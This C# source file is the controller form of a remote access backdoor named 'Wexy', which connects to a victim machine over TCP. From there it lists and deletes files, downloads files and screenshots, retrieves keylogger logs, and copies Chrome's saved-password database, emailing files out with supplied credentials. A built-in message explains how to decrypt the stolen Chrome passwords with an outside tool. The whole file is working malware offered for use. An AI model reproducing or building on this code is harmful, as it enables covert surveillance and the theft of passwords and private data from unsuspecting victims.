using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ComponentFactory.Krypton.Toolkit;
using System.Net.Sockets;
using System.IO;
namespace Wexy
{
    public partial class MainForm : KryptonForm
    {
        public static string received_data;
        public static NetworkStream Receiver; //this is used to get data from the server
        public static NetworkStream Writer; //this is used to send commands to the server
        public static string remotepcIp;
        public static int remotepcPort;
        public static TcpClient client;
        

        public MainForm()
        {
            InitializeComponent();
        }

        public static void SendCommand(string Command)
        {
            try
            {
                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "getos>" && Command != "ischruser>" && Command != "download>" && Command != "getFile>")
                {
                    byte[] Packet = Encoding.ASCII.GetBytes(Command);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
                else
                {
                    switch (Command)
                    {
                        case "pcname>":
                            byte[] Packet = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet, 0, Packet.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;

                        case "showfiles>":
                            byte[] Packet1 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet1, 0, Packet1.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;

                        case "showfolders>":
                            byte[] Packet2 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet2, 0, Packet2.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;

                        case "getos>":
                            byte[] Packet3 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet3, 0, Packet3.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;

                        case "ischruser>":
                            byte[] Packet4 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet4, 0, Packet4.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;
                        case "download>":
                            byte[] Packet5 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet5, 0, Packet5.Length);
                            Writer.Flush();
                            //ReceiveFile();
                            break;
                        case "getFile>":
                            byte[] Packet6 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet6, 0, Packet6.Length);
                            Writer.Flush();
                            ReceiveData();
                            break;
                    }
                }
            }
            catch
            {
                Writer.Close();
            }
        }

        public static void ReceiveData()
        {
            while (true)
            {
                try
                {             
                    byte[] RecPacket = new byte[7000];
                    Receiver.Read(RecPacket, 0, RecPacket.Length);
                    Receiver.Flush();
                    string data = Encoding.ASCII.GetString(RecPacket);
                    received_data = data;
                    break;
                }
                catch
                {
                    break;
                }
            }
        }

        public static void ReceiveFile(string fileType)
        {
            while (true)
            {
                try
                {
                    //195000 = 195 ko
                    byte[] RecPacket = new byte[195000];
                    Receiver.Read(RecPacket, 0, RecPacket.Length);
                    switch (fileType)
                    {
                        case "txt":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.txt", RecPacket);
                            break;
                        case "png":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.png", RecPacket);
                            break;
                        case "jpg":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.jpg", RecPacket);
                            break;
                        case "jpeg":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.jpeg", RecPacket);
                            break;
                        case "FILE":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.FILE", RecPacket);
                            break;
                        case "xml":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.xml", RecPacket);
                            break;
                        case "pdf":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.pdf", RecPacket);
                            break;
                        case "docx":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.docx", RecPacket);
                            break;
                        case "log":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.log", RecPacket);
                            break;
                        case "doc":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.doc", RecPacket);
                            break;
                        case "zip":
                            File.WriteAllBytes("c:/users/" + Environment.UserName + "/desktop/file.zip", RecPacket);
                            break;
                    }
                    Receiver.Flush();
                    break;
                }
                catch
                {
                    break;
                }
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            RemoteComputerIP r = new RemoteComputerIP();
            r.ShowDialog();
            remotepcIp = r.GetIp();
            remotepcPort = Int32.Parse(r.GetPort());
            lbl_ip.Text = remotepcIp + ":"+ remotepcPort.ToString();

            client = new TcpClient();
            
            try
            {
                client.Connect(remotepcIp, remotepcPort);
                Writer = client.GetStream();
                Receiver = client.GetStream();
                SendCommand("pcname>");
                lbl_pcname.Text = received_data;
                SendCommand("getos>");
                lbl_osversion.Text = received_data;
            }
            catch(Exception error)
            {
                MessageBox.Show("Could not connect to " + remotepcIp +"\n Error : "+error.Message);
                Application.Exit();
            }
        }

        #region Buttons events
        private void btn_openwebsite_Click(object sender, EventArgs e)
        {
            string website = txb_website.Text;
            SendCommand("open>" + website);
        }

        private void btn_openapp_Click(object sender, EventArgs e)
        {
            string app_name = txb_filelocation.Text;
            SendCommand("openApp>" + app_name);
        }

        private void btn_displaymessage_Click(object sender, EventArgs e)
        {
            string message = txb_message.Text;
            SendCommand("msg>" + message);
        }

        private void btn_showfiles_Click(object sender, EventArgs e)
        {
            // I added ReceiveData() here because there is a bug when using args(instruction>args) , the data is not retrieved and is pending, so I call it again.
            if (txb_directorypath.Text[txb_directorypath.Text.Length - 1] == '/')
            {
                lstbox_filesfolders.Items.Clear();
                lstbox_filesfolders.Focus();
                string dir_path = txb_directorypath.Text;
                SendCommand("showfiles>" + dir_path + ">");
                ReceiveData();
                lbl_filefolder.Text = "Files";

                string[] strings = received_data.Split('\n');
                foreach (string item in strings)
                {
                    lstbox_filesfolders.Items.Add(item);
                }
            }
            else
            {
                MessageBox.Show("This is not a folder , the backdoor may crash. If it is , add a '/' at the end.");
            }
            
        }
        private void btn_showdir_Click(object sender, EventArgs e)
        {
            if (txb_directorypath.Text[txb_directorypath.Text.Length - 1] == '/')
            {
                lstbox_filesfolders.Items.Clear();
                lstbox_filesfolders.Focus();
                string path = txb_directorypath.Text;
                SendCommand("showfolders>" + path + ">");
                ReceiveData();
                lbl_filefolder.Text = "Folders";

                string[] strings = received_data.Split('\n');
                foreach (string item in strings)
                {
                    lstbox_filesfolders.Items.Add(item);
                }
            }
            else
            {
                MessageBox.Show("This is not a folder , the backdoor may crash. If it is , add a '/' at the end.");
            }
                  
        }
        private void btn_sendfile_Click(object sender, EventArgs e)
        {
            string path = txb_filepath.Text;
            string from = txb_mailfrom.Text;
            string password = txb_mailfrompass.Text;
            string to = txb_mailto.Text;
            SendCommand("getFile>" + path + ">" + from + ">" + password + ">" + to+">");
            ReceiveData();
            MessageBox.Show(received_data);
        }

        private void btn_deletefile_Click(object sender, EventArgs e)
        {
            string location = txb_filelocation.Text;
            SendCommand("del>"+location+">");
        }

        private void btn_getchromepass_Click(object sender, EventArgs e)
        {
            SendCommand("ischruser>");
            string isChr = received_data;
            
            if (isChr != "not user")
            {
                SendCommand("copylogindata>");
                string pcname = lbl_pcname.Text;
                txb_filepath.Text = "C:/Users/" + pcname;
                txb_filepath.Text = txb_filepath.Text + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data.FILE";

                txb_filetodownload.Text = "C:/Users/" + pcname;
                txb_filetodownload.Text = txb_filetodownload.Text + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data.FILE";

                txb_filetype.Text = "FILE";
                MessageBox.Show("Login Data file Found !\nGoogle Chrome stores passwords in a file labelled 'Login Data'. " +
                "\nThe passwords are encrypted in a SQLITE database." +
                "\n[HOW TO GET THE PASSWORDS]\n-Open WebBrowserPassView.exe\n-Put the Login Data file from your mail in a folder->Rename the file to 'Login Data' and remove the extension '.FILE'" +
                "\n-In WebBrowserPassView, go to Options->Advanced Options->Chrome Options->" +
                "Tick User Data Folder->Browse the folder where Login Data is placed.");              
            }
            else
            {
                MessageBox.Show("No Google Chrome User Profile were found");
            }
        }

        private void btn_download_Click(object sender, EventArgs e)
        {
            string filepath = txb_filetodownload.Text;
            SendCommand("download>" + filepath + ">");
            string filetype = txb_filetype.Text;
            ReceiveFile(filetype);
            MessageBox.Show("File downloaded ! ");
        }

        private void btn_takescreen_Click(object sender, EventArgs e)
        {
            SendCommand("screenshot>");
            ReceiveFile("jpg");
            MessageBox.Show("Screenshot taken !");
        }

        private void btn_quit_Click(object sender, EventArgs e)
        {
            DialogResult dr = new DialogResult();
            ConfirmForm frm = new ConfirmForm();
            dr = frm.ShowDialog();
            if (dr == DialogResult.Yes)
            {
                SendCommand("killwexy>");
                MessageBox.Show("The backdoor stopped running on the remote machine.");
            }
        }

        private void lstbox_filesfolders_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(received_data.Contains("c:/"))
            {
                 txb_directorypath.Text = lstbox_filesfolders.SelectedItem.ToString();
            }
            else
            {
                
                txb_directorypath.Text = txb_directorypath.Text + lstbox_filesfolders.SelectedItem.ToString();
                int index1 = txb_directorypath.Text.IndexOf(" |");
                txb_directorypath.Text = txb_directorypath.Text.Remove(index1);
            }
        }

        private void btn_enablekeylogger_Click(object sender, EventArgs e)
        {
            SendCommand("getkeylogs>");
            ReceiveFile("txt");
            MessageBox.Show("The log file which contains the keys logged by the keyloggger was successfully captured !");            
        }
        #endregion
    }
}
